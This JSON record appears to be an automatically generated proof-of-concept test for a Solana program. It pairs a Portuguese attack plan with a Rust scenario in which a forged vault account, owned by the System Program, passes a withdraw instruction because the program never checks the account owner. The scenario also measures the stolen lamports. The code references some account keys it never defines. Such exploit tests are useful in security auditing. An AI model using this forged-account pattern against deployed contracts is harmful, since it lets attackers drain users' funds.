{
  "plan": "O atacante cria uma conta forjada (dono: System Program) com dados que colocam a chave da autoridade em [8..40] e um saldo alto em [40..48], e a passa como `vault`. O baseline usa uma conta vault real (dono: program_id) com os mesmos dados e a mesma autoridade, provando que o cenário está montado. O ataque é idêntico ao baseline, exceto que a conta vault tem dono diferente (System Program), explorando a ausência de checagem de owner. O efeito medido é que a conta forjada foi aceita e teve seus lamports debitados (ou seja, o ataque teve sucesso).",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let amount: u64 = 1000;

// Conta vault legitima (dono: program_id)
let mut vault_data = vec![0u8; 48];
vault_data[8..40].copy_from_slice(authority.as_ref());
vault_data[40..48].copy_from_slice(&5000u64.to_le_bytes());
let vault_legit = account(&env.program_id, &vault_data, Some(10000));

// Conta vault forjada (dono: System Program)
let vault_forged = account(&solana_sdk::system_program::id(), &vault_data, Some(10000));

let authority_account = wallet(1000);
let recipient_account = wallet(1000);

let mut ix_data = vec![1u8]; // IX_WITHDRAW
ix_data.extend_from_slice(&amount.to_le_bytes());

let metas = vec![
    AccountMeta::new(vault_legit_key, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];

// Baseline: usa vault legitima
let baseline_ix = env.raw_ix(&ix_data, metas.clone());
let baseline_accounts = vec![
    (vault_legit_key, vault_legit.clone()),
    (authority, authority_account.clone()),
    (recipient, recipient_account.clone()),
];
let baseline_result = env.baseline("withdraw legitimo", &baseline_ix, &baseline_accounts);

// Ataque: usa vault forjada (dono diferente)
let attack_metas = vec![
    AccountMeta::new(vault_forged_key, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];
let attack_ix = env.raw_ix(&ix_data, attack_metas);
let attack_accounts = vec![
    (vault_forged_key, vault_forged.clone()),
    (authority, authority_account.clone()),
    (recipient, recipient_account.clone()),
];
let attack_result = env.attack("withdraw com vault forjada", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let vault_after = after(&attack_result, &vault_forged_key);
    let recipient_after = after(&attack_result, &recipient);
    env.effect("lamports debitados da conta forjada", vault_after.lamports() == 10000 - amount);
    env.effect("lamports creditados no recipient", recipient_after.lamports() == 1000 + amount);
}"
}

